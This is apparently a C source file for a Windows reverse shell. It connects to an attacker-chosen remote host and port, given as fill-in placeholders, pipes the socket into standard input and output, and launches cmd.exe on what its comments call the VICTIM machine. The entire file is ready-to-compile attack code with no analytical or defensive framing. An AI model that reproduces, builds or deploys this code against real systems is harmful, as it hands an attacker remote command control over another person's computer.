#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>

int main()
{
	SOCKET shell; //Initalizing SOCKET
	struct sockaddr_in shell_addr; // Setting up structure
	WSADATA wsa;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	char ip_addr[] = "****CHANGE_ME_TO_DESIRED_RHOST****";
	int port = ****CHANGE_ME_TO_DESIRED_PORT****;
	int connection;
	char RecvServer[512];

	WSAStartup(MAKEWORD(2,2), &wsa); // Initializing WINSOCK
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int) NULL, (unsigned int) NULL); //Create TCP Socket descriptor

	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

	connection = WSAConnect(shell, (SOCKADDR *)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL); // Connect to TARGET server

	if (connection == SOCKET_ERROR)
	{
		printf("[!!!] Connection to the TARGET server failed.\n");
		exit(0);
	}
	else
	{
		recv(shell, RecvServer, sizeof(RecvServer), 0);
		memset(&si, 0, sizeof(si));
		si.cb = sizeof(si);
		si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; //Pipe Standard INPUT/OUTPUT/ERROR to our socket
		CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); // Spawn a command prompt on our VICTIM machine
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		memset(RecvServer, 0, sizeof(RecvServer));
	}
}
